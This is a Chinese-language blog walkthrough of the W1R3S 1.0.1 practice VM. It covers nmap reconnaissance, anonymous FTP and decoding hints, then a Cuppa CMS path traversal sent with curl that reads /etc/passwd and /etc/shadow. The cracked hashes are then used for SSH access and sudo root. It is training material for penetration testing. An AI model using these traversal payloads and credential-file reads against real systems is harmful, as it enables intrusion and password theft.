@@ -1,0 +1,554 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>W1R3S_1.0.1打靶日记 - Welcome Candy Box</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<meta name="description" content="1. nmap扫描1.1 IP地址确定 sudo nmap -sn 192.168.31.0&#x2F;24	&#x2F;&#x2F;-sn: Ping Scan - disable port scansudo arl-scan -l	&#x2F;&#x2F;功能类似  扫描当前网段存活的主机，指定一个C类地址进行扫描，扫描该地址段是否有主机存活；  通过开关靶机再次对本机网段进行扫描可以确定靶机">
+<meta property="og:type" content="article">
+<meta property="og:title" content="W1R3S_1.0.1打靶日记">
+<meta property="og:url" content="http://example.com/2024/05/07/W1R3S-1-0-1%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Welcome Candy Box">
+<meta property="og:description" content="1. nmap扫描1.1 IP地址确定 sudo nmap -sn 192.168.31.0&#x2F;24	&#x2F;&#x2F;-sn: Ping Scan - disable port scansudo arl-scan -l	&#x2F;&#x2F;功能类似  扫描当前网段存活的主机，指定一个C类地址进行扫描，扫描该地址段是否有主机存活；  通过开关靶机再次对本机网段进行扫描可以确定靶机">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071550966.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071554574.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071603054.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071604049.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071612904.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071611484.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071622560.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071624510.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071626275.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071624305.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072010161.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072016540.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072018715.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072025584.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072025028.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072029997.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072056973.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072058559.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072058313.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072058501.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072104075.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072108051.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072111899.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072116718.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072119239.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072123728.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072126969.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072127199.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072130619.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072146373.png">
+<meta property="article:published_time" content="2024-05-07T13:49:11.000Z">
+<meta property="article:modified_time" content="2024-05-07T13:50:49.556Z">
+<meta property="article:author" content="Candy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071550966.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1715089898472">
+
+<link rel="stylesheet" href="/css/style.css?v=1715089898472">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1715089898472">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1715089898473"></script>
+
+ 
+
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.2.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://i.dawnlab.me/b5a7e61560facdd5b8aa9683fce147d7.png)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="Candy"><img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="Candy"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Candy">
+            <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="Candy" alt="Candy">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>3</div>
+        <div><span>标签</span>0</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/donate.html" title="给我赞助">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                给我赞助
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:nexmoe.com" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://jq.qq.com/?_wv=1027&k=5CfKHun"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ群'}"
+			style="
+				color: rgb(249, 174, 8);
+				background-color: rgba(249, 174, 8, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/20238211"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/nexmoe/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://www.zhihu.com/people/nexmoe"
+			target="_blank"
+			mdui-tooltip="{content: '知乎'}"
+			style="
+				color: rgb(30, 136, 229);
+				background-color: rgba(30, 136, 229, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-zhihu"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://twitter.com/nexmoe"
+			target="_blank"
+			mdui-tooltip="{content: 'Twitter'}"
+			style="
+				color: rgb(59, 151, 239);
+				background-color: rgba(59, 151, 239, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-twitter"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://nexmoe.com/atom.xml"
+			target="_blank"
+			mdui-tooltip="{content: 'RSS'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-rss"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/05/07/W1R3S-1-0-1%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/">W1R3S_1.0.1打靶日记</a>
+          </li>
+        
+          <li>
+            <a href="/2024/05/07/sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">sqli-labs通关笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2024/05/05/github-io-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">github.io+hexo搭建个人博客</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="https://xiaoshu.app/" target="_blank" >
+                    <img src="https://xsm.nexmoe.com/images/Infinite/Snipaste_2022-05-18_20-46-50.png" alt="nihao"></img>
+                    <p>nihao</p>
+                </a>
+            </li>
+        
+            <li>
+                <a href="https://nexmoe.com/" target="_blank" >
+                    <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="折影轻梦"></img>
+                    <p>折影轻梦</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2024 Candy
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br><a target="_blank" href="https://beian.miit.gov.cn/">鄂ICP备2020018486号</a> <br><a target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral"> <img src="https://i.dawnlab.me/c0268c1e6cfd0863d6ba35be1575941a.png" width="150px"></a>
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="https://i.dawnlab.me/b5a7e61560facdd5b8aa9683fce147d7.png" alt="W1R3S_1.0.1打靶日记" loading="lazy">
+            <h1>W1R3S_1.0.1打靶日记</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2024年05月07日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-IP地址确定"><a href="#1-1-IP地址确定" class="headerlink" title="1.1 IP地址确定"></a>1.1 IP地址确定</h2><blockquote>
+<p>sudo nmap -sn 192.168.31.0&#x2F;24	&#x2F;&#x2F;-sn: Ping Scan - disable port scan<br>sudo arl-scan -l	&#x2F;&#x2F;功能类似</p>
+</blockquote>
+<p>扫描当前网段存活的主机，指定一个C类地址进行扫描，扫描该地址段是否有主机存活；</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071550966.png" alt="image-20240507155041932" data-caption="image-20240507155041932" loading="lazy"></p>
+<p>通过开关靶机再次对本机网段进行扫描可以确定靶机的ip地址，以下是打开靶机的ip地址查询；</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071554574.png" alt="image-20240507155421958" data-caption="image-20240507155421958" loading="lazy"></p>
+<p>可以确定靶机的ip地址为<code>192.168.31.52</code></p>
+<h2 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h2><blockquote>
+<p>nmap -sT –min-rate 10000 -p- 192.168.31.52 -oA nmapscan&#x2F;w1r3sports</p>
+</blockquote>
+<p><code>-sT</code>: 使用tcp三次握手的过程进行探测端口是否开放（相对较慢，但相对准确）；</p>
+<p><code>-sS</code>: 默认扫描方式，通过syn标志位进行检测连接是否开放（容易被防火墙挡住）；</p>
+<p><code>-oA</code>：以全格式保存在后续的地址文件中，以三种不同的后缀文件名保存；</p>
+<p><code>--min-rate</code>: 指定扫描的速度，在正式的护网中要比10000还慢；</p>
+<p><code>-p</code>：指定扫描端口，<code>-p-</code>指的是从1到65535端口</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071603054.png" alt="image-20240507160325015" data-caption="image-20240507160325015" loading="lazy"></p>
+<blockquote>
+<p>grep open w1r3sports.nmap | awk -F’&#x2F;‘ ‘{print $1}’ | paste -sd ‘,’</p>
+</blockquote>
+<p><code>-F&#39;/&#39;</code>:以’&#x2F;‘分隔提取字符串</p>
+<p><code>$1</code>：是指分隔后的第一个变量</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071604049.png" alt="image-20240507160445016" data-caption="image-20240507160445016" loading="lazy"></p>
+<blockquote>
+<p>sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.31.52 -oA nmapscan&#x2F;portsdetail</p>
+</blockquote>
+<p><code>-sV</code>：扫描提供服务的版本</p>
+<p><code>-sC</code>：用默认的脚本进行扫描</p>
+<p><code>-O</code>：扫描操作系统的版本</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071612904.png" alt="image-20240507161230829" data-caption="image-20240507161230829" loading="lazy"></p>
+<p>优先级最高的端口是21和3306，观看是否能给我们提取到什么东西</p>
+<p>然后再看端口80，兔子洞，重点检查</p>
+<p>优先级最低的端口是22，一般情况下不可能是直接通过ssh登录</p>
+<blockquote>
+<p>sudo nmap -sU –top-ports 20 192.168.31.52 -oA nmapscan&#x2F;udpports</p>
+</blockquote>
+<p><code>--top-ports</code>：扫描最常用的n个端口，空格接数量；</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071611484.png" alt="image-20240507161143441" data-caption="image-20240507161143441" loading="lazy"></p>
+<blockquote>
+<p>sudo nmap -script&#x3D;vuln -p21,22,80,3306 192.168.31.52 -oA nmapscan&#x2F;vuln</p>
+</blockquote>
+<p>nmap的端口漏洞扫描</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071622560.png" alt="image-20240507162205500" data-caption="image-20240507162205500" loading="lazy"></p>
+<h2 id="1-3-ftp连接测试"><a href="#1-3-ftp连接测试" class="headerlink" title="1.3 ftp连接测试"></a>1.3 ftp连接测试</h2><blockquote>
+<p>ftp 192.168.31.52</p>
+<p>binary</p>
+<p>ls</p>
+<p>cd content</p>
+<p>prompt</p>
+<p>mget *.txt	&#x2F;&#x2F;批量下载文件</p>
+<p>get 01.txt	&#x2F;&#x2F;单个文件下载</p>
+</blockquote>
+<p>ftp连接，通过使用<code>anonymous</code>匿名登录，密码为空，登录后切换二进制模式，否则可能下载下来的可执行文件是坏文件，无法使用</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071624510.png" alt="image-20240507162458445" data-caption="image-20240507162458445" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071626275.png" alt="image-20240507162623214" data-caption="image-20240507162623214" loading="lazy"></p>
+<p>查看下载文件的内容：</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071624305.png" alt="image-20240507162435233" data-caption="image-20240507162435233" loading="lazy"></p>
+<p>可以看到有许多的加密代码，例如下方</p>
+<blockquote>
+<p>01ec2d8fc11c493b25029fb1f47f39ce</p>
+<p>SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg&#x3D;&#x3D;</p>
+<pre><code> ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡
+</code></pre>
+<p>.punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</p>
+</blockquote>
+<h1 id="2-hash-identifier工具"><a href="#2-hash-identifier工具" class="headerlink" title="2. hash-identifier工具"></a>2. hash-identifier工具</h1><p>帮助识别字符串是什么加密算法；</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072010161.png" alt="image-20240507201022086" data-caption="image-20240507201022086" loading="lazy"></p>
+<p>可以看到相应的字符串应该是<code>md5</code>加密，通过MD5解密即可</p>
+<h1 id="3-解密密文"><a href="#3-解密密文" class="headerlink" title="3. 解密密文"></a>3. 解密密文</h1><p>对于上述得出密文进行解密</p>
+<blockquote>
+<p>01ec2d8fc11c493b25029fb1f47f39ce</p>
+<p>This is not a password</p>
+</blockquote>
+<p>通过hash-identifier可以知道这是md5加密，使用md5解密工具即可解密得出</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072016540.png" alt="image-20240507201644444" data-caption="image-20240507201644444" loading="lazy"></p>
+<blockquote>
+<p>SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg&#x3D;&#x3D;</p>
+<p><code>echo &quot;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&quot; | base64 -d</code></p>
+<p>在多接触加密密文后，可以感知这大概率是base64加密，经典的双等号结尾</p>
+<p>It is easy, but not that easy..</p>
+</blockquote>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072018715.png" alt="image-20240507201851684" data-caption="image-20240507201851684" loading="lazy"></p>
+<p>直接使用echo命令即可解密</p>
+<blockquote>
+<p>​	ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡</p>
+<p>.punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</p>
+</blockquote>
+<p>反转文本：<a target="_blank" rel="noopener" href="https://www.upsidedowntext.com/">https://www.upsidedowntext.com/</a></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072025584.png" alt="image-20240507202506542" data-caption="image-20240507202506542" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072025028.png" alt="image-20240507202521988" data-caption="image-20240507202521988" loading="lazy"></p>
+<h1 id="4-3306端口sql测试"><a href="#4-3306端口sql测试" class="headerlink" title="4. 3306端口sql测试"></a>4. 3306端口sql测试</h1><blockquote>
+<p>mysql -h 192.168.31.52 -u root -p</p>
+</blockquote>
+<p>测试是否存在相应的漏洞或是否能够获得什么其他的信息</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072029997.png" alt="image-20240507202934962" data-caption="image-20240507202934962" loading="lazy"></p>
+<h1 id="5-gobuster目录爆破"><a href="#5-gobuster目录爆破" class="headerlink" title="5. gobuster目录爆破"></a>5. gobuster目录爆破</h1><blockquote>
+<p>sudo gobuster dir -u <a target="_blank" rel="noopener" href="http://192.168.31.52/">http://192.168.31.52</a> –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt</p>
+</blockquote>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072056973.png" alt="image-20240507205610907" data-caption="image-20240507205610907" loading="lazy"></p>
+<p>可以看出爆破除了的几个目录分别为</p>
+<blockquote>
+<p><code>http://192.168.31.52/wordpress</code></p>
+<p><code>http://192.168.31.52/javascript</code></p>
+<p><code>http://192.168.31.52/administrator</code></p>
+</blockquote>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072058559.png" alt="image-20240507205804520" data-caption="image-20240507205804520" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072058313.png" alt="image-20240507205814278" data-caption="image-20240507205814278" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072058501.png" alt="image-20240507205838447" data-caption="image-20240507205838447" loading="lazy"></p>
+<p>能够获得的信息是在网址<code>http://192.168.31.52/administrator</code>下看到的cuppa CMS框架</p>
+<p>查询该CMS是否存在相应漏洞</p>
+<p>第一个<code>http://192.168.31.52/wordpress</code>网址无法访问,即使通过修改host依旧无法访问,虽然无法完全排除漏洞,但是已经没有太多切入点了.</p>
+<h1 id="6-漏洞搜索"><a href="#6-漏洞搜索" class="headerlink" title="6. 漏洞搜索"></a>6. 漏洞搜索</h1><blockquote>
+<p>searchsploit cuppa cms</p>
+</blockquote>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072104075.png" alt="image-20240507210427028" data-caption="image-20240507210427028" loading="lazy"></p>
+<blockquote>
+<p>searchsploit cuppa cms -m 25971</p>
+</blockquote>
+<h1 id="7-浏览器发送数据"><a href="#7-浏览器发送数据" class="headerlink" title="7. 浏览器发送数据"></a>7. 浏览器发送数据</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.31.52/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.31.52/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p>
+</blockquote>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072108051.png" alt="image-20240507210859003" data-caption="image-20240507210859003" loading="lazy"></p>
+<p>可能是post传输导致传输失败,通过网页搜索找到cms源码进行审计,发现确实是post传输导致数据传输失败</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072111899.png" alt="image-20240507211121754" data-caption="image-20240507211121754" loading="lazy"></p>
+<blockquote>
+<p>将数据url编码以post方式传输</p>
+<p>curl –data-urlencode ‘urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd’ <a target="_blank" rel="noopener" href="http://192.168.31.52/administrator/alerts/alertConfigField.php">http://192.168.31.52/administrator/alerts/alertConfigField.php</a></p>
+</blockquote>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072116718.png" alt="image-20240507211654580" data-caption="image-20240507211654580" loading="lazy"></p>
+<p>可以看到列出了<code>passwd</code>的内容,然后读出hash的<code>shadow</code>文件的内容</p>
+<blockquote>
+<p>&#x2F;etc&#x2F;<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=shadow&spm=1001.2101.3001.7020">shadow</a> 文件，用于存储 Linux 系统中用户通过hash加密的密码信息，又称为“影子文件”。</p>
+<p>由于&#x2F;etc&#x2F;passwd文件允许所有用户读取，易导致用户密码泄露，因此 Linux 系统将用户的密码信息从 &#x2F;etc&#x2F;passwd 文件中分离出来，并单独放到了此文件中。</p>
+</blockquote>
+<blockquote>
+<p>curl –data-urlencode ‘urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;shadow’ <a target="_blank" rel="noopener" href="http://192.168.31.52/administrator/alerts/alertConfigField.php">http://192.168.31.52/administrator/alerts/alertConfigField.php</a></p>
+</blockquote>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072119239.png" alt="image-20240507211948113" data-caption="image-20240507211948113" loading="lazy"></p>
+<p>将该部分的内容复制保存下来,并将没有hash值得用户删除,得到</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072123728.png" alt="image-20240507212348687" data-caption="image-20240507212348687" loading="lazy"></p>
+<h1 id="8-hash爆破"><a href="#8-hash爆破" class="headerlink" title="8. hash爆破"></a>8. hash爆破</h1><blockquote>
+<p>john shadow.hash</p>
+</blockquote>
+<p>破解密码</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072126969.png" alt="image-20240507212631246" data-caption="image-20240507212631246" loading="lazy"></p>
+<p>可以看到已经破解得到两个,测试使用ssh进行连接</p>
+<p><code>www-data</code>一般是功能型账户</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072127199.png" alt="image-20240507212726362" data-caption="image-20240507212726362" loading="lazy"></p>
+<p>成功连接w1r3s账户,通过<code>id</code>命令可以得知其具有sudo权限,通过<code>sudo su</code>命令成功获得系统<code>root</code>权限.</p>
+<p>至此完成提权.</p>
